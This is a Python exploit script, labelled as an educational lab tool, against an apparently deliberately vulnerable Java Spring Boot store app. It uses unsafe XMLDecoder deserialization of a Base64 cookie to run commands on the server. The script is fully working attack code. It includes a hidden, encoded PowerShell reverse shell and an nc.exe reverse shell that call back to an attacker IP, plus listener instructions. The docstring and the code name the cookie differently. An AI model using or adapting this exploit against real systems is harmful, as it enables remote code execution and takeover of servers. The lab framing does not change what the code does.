#!/usr/bin/env python3
"""
Java Store Application - XMLDecoder Deserialization RCE Exploit
EDUCATIONAL PURPOSES ONLY - Authorized Lab Testing

Vulnerability Details:
- Application: Java Spring Boot Store App (Port 8888)
- Endpoint: All endpoints (via AutoLoginInterceptor)
- Parameter: Cookie "user" 
- Weakness: Unsafe XMLDecoder deserialization of cookie value
- Exploitation: Send malicious XML payload in cookie to achieve RCE
"""

import requests
import sys
import argparse
import time
import base64
from pathlib import Path

class XMLDecoderExploit:
    def __init__(self, target_url, attacker_ip, attacker_port):
        self.base_url = target_url.rstrip('/')
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.session = requests.Session()
        
    def create_xml_payload(self, cmd_parts):
        """Create XMLDecoder payload with ProcessBuilder"""
        payload_parts = ['<?xml version="1.0" encoding="UTF-8"?>']
        payload_parts.append('<java version="1.8.0" class="java.beans.XMLDecoder">')
        payload_parts.append(' <object class="java.lang.ProcessBuilder">')
        payload_parts.append(f'  <array class="java.lang.String" length="{len(cmd_parts)}">')
        
        for idx, part in enumerate(cmd_parts):
            payload_parts.append(f'   <void index="{idx}">')
            payload_parts.append(f'    <string>{part}</string>')
            payload_parts.append('   </void>')
        
        payload_parts.append('  </array>')
        payload_parts.append('  <void method="start"/>')
        payload_parts.append(' </object>')
        payload_parts.append('</java>')
        
        return '\n'.join(payload_parts)
    
    def create_reverse_shell_payload(self):
        """Create payload that spawns reverse shell using PowerShell Base64"""
        # PowerShell reverse shell (sin caracteres especiales problemáticos)
        ps_cmd = f'$c=New-Object System.Net.Sockets.TCPClient("{self.attacker_ip}",{self.attacker_port});'
        ps_cmd += '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};'
        ps_cmd += 'while(($i=$s.Read($b,0,$b.Length)) -ne 0){'
        ps_cmd += '$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);'
        ps_cmd += '$sb=(iex $d 2>&1|Out-String);'
        ps_cmd += '$sb2=$sb+"PS "+(pwd).Path+"> ";'
        ps_cmd += '$sb3=([text.encoding]::ASCII).GetBytes($sb2);'
        ps_cmd += '$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()'
        
        # Encode PowerShell command to Base64 (UTF-16LE requerido por PowerShell)
        ps_b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
        
        # Command to execute encoded PowerShell - SIN caracteres especiales para XML
        full_cmd = f'powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {ps_b64}'
        
        return self.create_xml_payload(['cmd.exe', '/c', full_cmd])
    
    def create_netcat_payload(self):
        """Create payload using netcat if available"""
        # Try to use nc.exe if available on the system
        nc_cmd = f'nc.exe {self.attacker_ip} {self.attacker_port} -e cmd.exe'
        return self.create_xml_payload(['cmd.exe', '/c', nc_cmd])
    
    def create_test_payload(self):
        """Create simple test payload (pops calculator)"""
        return self.create_xml_payload(['cmd.exe', '/c', 'calc.exe'])
    
    def encode_payload(self, xml_payload):
        """Encode XML payload as Base64 for cookie"""
        return base64.b64encode(xml_payload.encode()).decode()
    
    def trigger_deserialization(self, cookie_value):
        """Trigger the deserialization by sending malicious cookie"""
        print(f"[*] Sending malicious cookie to: {self.base_url}")
        
        cookies = {'user-info': cookie_value}
        
        try:
            response = requests.get(self.base_url, cookies=cookies, timeout=10)
            print(f"[+] Request sent - Status: {response.status_code}")
            return True
        except requests.exceptions.Timeout:
            print("[+] Request timed out (payload may have executed)")
            return True
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def exploit(self, test_mode=False):
        """Full exploitation chain"""
        print("=" * 70)
        print("Java Store Application - XMLDecoder Deserialization RCE")
        print("=" * 70)
        print(f"[*] Target: {self.base_url}")
        print(f"[*] Attack: XMLDecoder unsafe deserialization")
        print()
        
        if test_mode:
            print("[*] Test Mode: Will pop calculator")
            xml_payload = self.create_test_payload()
        else:
            print(f"[*] Reverse Shell: {self.attacker_ip}:{self.attacker_port}")
            print()
            print("[!] IMPORTANT: Start your listener NOW if not already running:")
            print(f"    nc -lvnp {self.attacker_port}")
            print()
            input("[*] Press ENTER when listener is ready...")
            
            xml_payload = self.create_reverse_shell_payload()
        
        print()
        print("[*] Step 1: Generating malicious XML payload...")
        print(f"[+] Payload length: {len(xml_payload)} bytes")
        
        print()
        print("[*] Step 2: Encoding payload as Base64...")
        cookie_value = self.encode_payload(xml_payload)
        print(f"[+] Cookie length: {len(cookie_value)} characters")
        
        print()
        print("[*] Step 3: Triggering deserialization...")
        success = self.trigger_deserialization(cookie_value)
        
        if success:
            print()
            print("[✓] Exploitation complete!")
            if test_mode:
                print("[*] Check if calculator opened")
            else:
                print("[*] Check your listener for the reverse shell connection")
            return True
        else:
            print()
            print("[-] Exploitation may have failed")
            return False

def main():
    parser = argparse.ArgumentParser(
        description='Exploit Java Store App XMLDecoder deserialization (Lab use only)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Test exploitation (pops calculator)
  python exploit_xmldecoder.py --test
  
  # Get reverse shell
  python exploit_xmldecoder.py --ip YOUR_IP --port 4444
  
  # Specify custom target
  python exploit_xmldecoder.py --target http://192.168.1.100:8888 --ip YOUR_IP --port 4444
        '''
    )
    
    parser.add_argument('--target', default='http://localhost:8888',
                       help='Target application URL (default: http://localhost:8888)')
    parser.add_argument('--ip', 
                       help='Your IP address for reverse connection')
    parser.add_argument('--port', type=int, default=4444,
                       help='Port for reverse connection (default: 4444)')
    parser.add_argument('--test', action='store_true',
                       help='Test mode: pop calculator instead of reverse shell')
    
    args = parser.parse_args()
    
    if not args.test and not args.ip:
        print("[-] Error: --ip required (or use --test for test mode)")
        sys.exit(1)
    
    print()
    print("╔" + "═" * 68 + "╗")
    print("║" + " " * 15 + "EDUCATIONAL LAB EXPLOITATION TOOL" + " " * 20 + "║")
    print("║" + " " * 10 + "Ensure you have authorization to test this system" + " " * 8 + "║")
    print("╚" + "═" * 68 + "╝")
    print()
    
    exploit = XMLDecoderExploit(args.target, args.ip or "127.0.0.1", args.port)
    exploit.exploit(test_mode=args.test)

if __name__ == '__main__':
    main()
